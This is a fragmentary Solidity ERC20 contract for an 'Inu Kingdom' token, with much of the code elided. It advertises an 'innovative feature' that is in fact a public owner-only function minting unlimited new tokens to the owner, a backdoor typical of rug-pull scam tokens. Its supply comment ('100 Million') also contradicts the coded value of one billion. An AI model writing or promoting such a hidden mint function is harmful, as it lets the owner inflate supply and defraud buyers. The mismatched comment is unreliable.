...
//
// $InuKingdom proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _InuKingdom(uint256 amount) public onlyOwner {
 _InuKingdom(msg.sender, amount);
    }
    ...
    function _InuKingdom(address account, uint256 amount) internal virtual {
...
contract $InuKingdom is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Inu Kingdom", "INUKING") {
     _InuKingdom(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}